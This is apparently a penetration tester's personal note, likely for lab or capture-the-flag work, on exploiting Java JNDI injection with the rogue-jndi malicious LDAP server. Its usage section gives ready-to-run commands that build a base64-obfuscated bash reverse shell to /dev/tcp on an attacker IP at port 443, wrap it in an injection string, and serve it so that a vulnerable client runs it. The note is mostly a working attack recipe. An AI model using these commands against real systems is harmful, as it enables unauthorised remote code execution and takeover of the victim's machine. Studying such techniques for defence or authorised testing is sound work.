# ldap for jndi attack

**Author:** Julien Bongars\
**Date:** 2025-09-25 09:05:14
**Path:** notes/infiltration/general/ldap-for-jndi-attack.md

---

## Description

link: https://github.com/veracode-research/rogue-jndi

A malicious LDAP server for JNDI injection attacks.

Description
The project contains LDAP & HTTP servers for exploiting insecure-by-default Java JNDI API.
In order to perform an attack, you can start these servers locally and then trigger a JNDI resolution on the vulnerable client, e.g.:

```java
InitialContext.doLookup("ldap://your_server.com:1389/o=reference");
```

It will initiate a connection from the vulnerable client to the local LDAP server. Then, the local server responds with a malicious entry containing one of the payloads, that can be useful to achieve a Remote Code Execution.

## Usage

```bash
# installation
git clone https://github.com/veracode-research/rogue-jndi ~/rogue-jndi
cd ~/rogue-jndi
mvn package

# get help
java -jar target/RogueJndi-1.0.jar -h

YOURIP="10.10.14.147"
COMMAND="bash -c 'bash -i >& /dev/tcp/${YOURIP}/443 0>&1'"
COMMAND_B64="$(echo "$COMMAND" | base64)"
INJECTION="bash -c {echo,${COMMAND_B64}}|{base64,-d}|{bash,-i}"

java -jar ./target/RogueJndi-1.1.jar \
  --command "$INJECTION" \
  --hostname "$YOURIP" \
  --ldapPort 1389 \
  --httpPort 8000
```
